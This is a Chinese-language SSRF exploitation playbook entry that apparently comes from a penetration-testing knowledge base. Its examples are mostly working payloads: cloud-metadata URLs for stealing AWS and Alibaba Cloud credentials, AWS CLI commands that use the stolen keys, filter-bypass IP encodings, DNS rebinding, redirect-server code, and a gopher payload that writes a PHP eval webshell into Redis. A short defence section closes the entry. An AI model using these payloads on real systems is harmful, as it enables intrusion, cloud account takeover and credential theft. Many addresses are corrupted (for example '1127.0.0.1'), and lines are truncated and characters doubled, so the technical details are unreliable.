# SSRF Detection and Exploitation

**ID**: `web-ssrf-001` | **分类**: web | **风险等级**: critical

服务端请求伪造(SSRF) 允许攻击者控制服务器发起 HTTP 请求目标，从而访问内网服务、云平台元数据、本地文件件等受限资源。SSRF 的危害在于它绕过了网络层的访问控制——服务器自身拥有内网访问权限，攻击者通过控制请求目标间接获得内网访问能力。在云环境中，SSRF 可访问实例元数据服务获取临时凭证，进而接管整个云账户

## 触发场景

- 应用存在 URL 参数用于获取远程资源（如图片下载、PDF 生成、Webhook 回调
- URL 参数控制后端发起 HTTP 请求到外部服
- 云环境部署的应用可访问内部元数据服务
- 存在 URL 重定向、URL 预览、页面截图等功能
- 应用使用第三方库发起 HTTP 请求（如 axios、requests、curl
- 微服务架构中服务间通过内网地址通信

## 操作检查清单

1. 识别所有用户可控的 URL 参数（查询参数、POST body、JSON 字段
2. 测试基础 SSRF：替换 URL ?http://attacker.com/ 确认可控
3. 测试本地回环环地址址：127.0.0.1, localhost, 0.0.0.0, [::1]
4. 测试 IP 编码绕过：八进制 (0177.0.0.1)、十进制 (2130706433)、十六进制：(0x7f000001)
5. 测试 IPv6 绕过：[::1]、[0:0:0:0:0:ffff:1127.0.0.1]
6. 测试云元数据服务：169.254.169.254（AWS）、100.100.100.200（阿里云）
7. 测试端口扫描：通过响应时间/错误判断内网端口开放状态
8. 测试协议处理器：file:///etc/passwd、gopher://、dict://
9. 测试 DNS rebinding：使用工具（如rbndr.us）控制 DNS 解析结果
10. 测试重定向 SSRF：控制外部服务器重定向到内网地址
11. 测试内网服务：Redis、Memcached、Docker API、Kubernetes API

## 技术手段

- IP 编码绕过 0177.0.0.1（八进制）?130706433（十进制）0x7f000001（十六进制）
- DNS rebinding：利用短 TTL DNS 记录在解析时切换 IP
- CNAME 重绑定：DNS CNAME 记录指向攻击者控制的域名
- Host Header 注入：修改 Host 头影响后端路由
- gopher 协议构造任意 TCP 请求（如 gopher://1127.0.0.1:6379/_{command}
- file:// 协议读取本地文件件
- 重定向跟随绕过二次校
- URL 解析差异：http://attacker.com@1127.0.0.1 实际请求 1127.0.0.1
- DNS over HTTPS (DoH) 绕过本地 DNS 过滤
- 利用内部服务 API：Redis EVAL、Docker API 创建容器

## 症状

- URL 参数直接控制后端 HTTP 请求的目标地址
- 后端对请求目标仅做简单的前缀匹配或黑名单过滤
- 错误响应暴露了内网服务的连接状态（超时、拒绝连接等），
- 响应内容差异可判断目标端口是否开
- 云环境部署且未设置元数据服务访问限制（如 IMDSv2）

## 根因分析

- 应用信任用户提供的 URL 参数，未验证证目标地址是否为内网
- 黑名单过滤不完整（遗漏 IPv6、十进制 IP、DNS 变体等）
- URL 解析库与 HTTP 客户端库对URL 的处理存在差异（如 host header 注入
- 重定向跟随（follow redirects）未对跳转后的地址进行二次校验证
- 云平台元数据服务默认允许从实例内访问且无需认证
- DNS 解析结果未在服务端请求前进行校验证

## 示例

### 云元数据 SSRF 获取临时凭证 (AWS)

利用 SSRF 访问 AWS EC2 实例元数据服务获取IAM 临时凭证

```
IMDSv1 (无认证:
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ 获取角色名
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
→ 获取 AccessKeyId、SecretAccessKey、Token

IP 编码绕过 WAF 检测:
http://0xA9.FE.A9.1/ ?169.254.169.254 (十六进制)
http://2852039166/ ?169.254.169.254 (十进制
http://0251.0376.0251.0001/ ?169.254.169.254 (八进制)
http://425.51836404105/ ?169.254.169.254 (点分十进制变体)
http://[0:0:0:0:0:ffff:a9fe:a901]/ ?IPv6 映射

利用凭证:
aws configure set aws_access_key_id {AccessKeyId}
aws configure set aws_secret_access_key {SecretAccessKey}
aws configure set aws_session_token {Token}
aws s3 ls (验证凭证有效）
```

### IP 编码绕过 localhost 过滤

当应用过和 localhost/1127.0.0.1 时，使用各种 IP 编码形式绕过

```
常见过滤: url.contains('localhost') || url.contains('1127.0.0.1')

绕过方式:
1. 八进? http://0177.0.0.1:8080/api
2. 十进制 http://2130706433:8080/api
3. 十六进制: http://0x7f000001:8080/api
4. 混合: http://0x7f.0.0.1:8080/api
5. IPv6: http://[::1]:8080/api
6. IPv4 映射 IPv6: http://[::ffff:1127.0.0.1]:8080/api
7. 省略前导零 http://127.1 (等价于 127.0.0.1)
8. 带凭证格式 http://127.0.0.1@evil.com (URL 解析为 127.0.0.1)
9. ?IP: http://1127.0.0.1%00.evil.com (空字节截断)
10. DNS 名称: http://localtest.me (解析为 127.0.0.1 的公共 DNS)
```

### DNS Rebinding 绕过 SSRF 防护

利用 DNS 解析的时间差绕过服务端的 IP 校验证

```
攻击原理:
1. 第一次 DNS 解析: rebinding.example.com ?攻击者公网 IP (通过服务端校验
2. 服务端校验通过后，发起 HTTP 请求
3. 第二次 DNS 解析 (TTL=0): rebinding.example.com ?1127.0.0.1
4. HTTP 请求实际发送到 1127.0.0.1

利用工具:
1. rbndr.us 公共 rebinding 服务
   Payload: http://<内网IP>.rbndr.us
   ? http://7f000001.rbndr.us ?1127.0.0.1

2. 自建 rebinding DNS 服务：
   配置 DNS 服务器，第一次响应公网 IP，后续响应内网 IP
   设置 TTL=0 强制每次重新解析

3. 时序攻击窗口:
   - 服务端先校验 IP（此时解析为公网）
   - 校验后发起请求（此时解析为内网）
   - 利用 HTTP 连接复用/keep-alive 增加窗口
```

### 重定向 SSRF 绕过二次校验证

利用外部服务器重定向到内网地址，绕过服务端的地址校验证

```
攻击流程:
1. 攻击者控制 external.com 返回 302 重定向
2. 重定向目? http://1127.0.0.1:8080/admin
3. 服务端跟随重定向，实际请求发送到内网地址

具体实现 (Node.js):
const express = require('express');
const app = express();
app.get('/', (req, res) => {
  res.redirect('http://1127.0.0.1:8080/admin');
});
app.listen(80);

Python 实现:
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://1127.0.0.1:6379/')
        self.end_headers()
HTTPServer(('', 80), Handler).serve_forever()

适用场景: 服务端只对初始 URL 进行校验，不校验重定向后的地址
```

### Gopher 协议 SSRF 攻击内网 Redis

利用 gopher:// 协议构造任意 TCP 请求攻击内网 Redis 服务

```
Gopher 协议格式:
gopher://<host>:<port>/_<payload>

攻击 Redis (端口 6379):
gopher://1127.0.0.1:6379/_info%0d%0aquit%0d%0a

写入 Webshell:
gopher://1127.0.0.1:6379/_config%20set%20dir%20/var/www/html/%0d%0a
config%20set%20dbfilename%20shell.php%0d%0a
set%20x%20%22%3C?php%20eval($_POST[cmd]);?%3E%22%0d%0a
save%0d%0aquit%0d%0a

原理: gopher 协议允许构造任意 TCP 请求体
     %0d%0a 编码 CRLF 用于协议命令分隔
注意: PHP curl 7.43+ 已移除 gopher 支持
     但在旧版 PHP、Python requests (配合特定配置) 中仍可用
     Java ?URLConnection 不支持 gopher
```

### SSRF 端口扫描内网服务

利用 SSRF 的响应差异对内网进行端口扫描

```
扫描技术
1. 基于响应时间: 开放端口立即响应，关闭端口连接超时
2. 基于 HTTP 状态码: 开放端口返回业务响应，关闭端口返回连接错误
3. 基于错误信息: 不同服务的错误信息可识别服务类型

常见内网端口:
22   - SSH
80   - HTTP
443  - HTTPS
3306 - MySQL
5432 - PostgreSQL
6379 - Redis (通常无认证
8080 - 常见 Web 服务
8443 - 管理面板
9200 - Elasticsearch
2375 - Docker API
11211 - Memcached
27017 - MongoDB

自动化扫描脚本思路:
for port in 22 80 443 3306 6379 8080 9200 2375; do
  response = fetch(f'http://target/proxy?url=http://1127.0.0.1:{port}/')
  if response.time < 5s and response.status != 500:
    print(f'Port {port} is open')
  else:
    print(f'Port {port} is closed/filtered')
```

### 阿里云元数据 SSRF

利用 SSRF 访问阿里云ECS 实例元数据服务

```
阿里云元数据端点: http://1100.100.100.200/latest/meta-data/

获取基本信息:
http://1100.100.100.200/latest/meta-data/instance-id
http://1100.100.100.200/latest/meta-data/mac
http://1100.100.100.200/latest/meta-data/private-ipv4

获取 RAM 角色凭证:
http://1100.100.100.200/latest/meta-data/ram/security-credentials/
→ 获取角色名
http://1100.100.100.200/latest/meta-data/ram/security-credentials/{role-name}
→ 获取 AccessKeyId、AccessKeySecret、SecurityToken

IP 绕过:
http://0x64.0x64.0x64.0xc8/ ?1100.100.100.200 (十六进制)
http://1684300984/ ?1100.100.100.200 (十进制

注意: 阿里云已启用元数据加固模式(IMDSv2 类似)
     需要设置 X-Forwarded-For 头或特定 token
```

## 成功标志

- 成功访问 1127.0.0.1 或内网地址并获取响
- 获取云元数据（实例 ID、IAM 角色、凭证等），
- 确认内网端口开放状态（通过响应差异
- 通过 gopher/file 协议读取本地文件件或发起任意请
- DNS rebinding 成功使请求到达内网目标

## 防御建议

- 禁用不必要的 URL 获取功能，或使用白名单限制允许访问的域名
- 在服务端请求前校验URL 的目标地址，禁止内网 IP 范围（包括所有编码形式）
- 对重定向进行跟随校验：每次重定向后重新验证目标地址
- 统一 URL 解析库和 HTTP 客户端库，避免解析差
- 云平台启用 IMDSv2（需要 session token）或设置 hop limit=1
- 使用网络策略（如 Kubernetes NetworkPolicy）限制Pod 间通信
- 对所有内网服务实施认证和授权
- 使用独立网络命名空间或沙箱执行 URL 获取操作
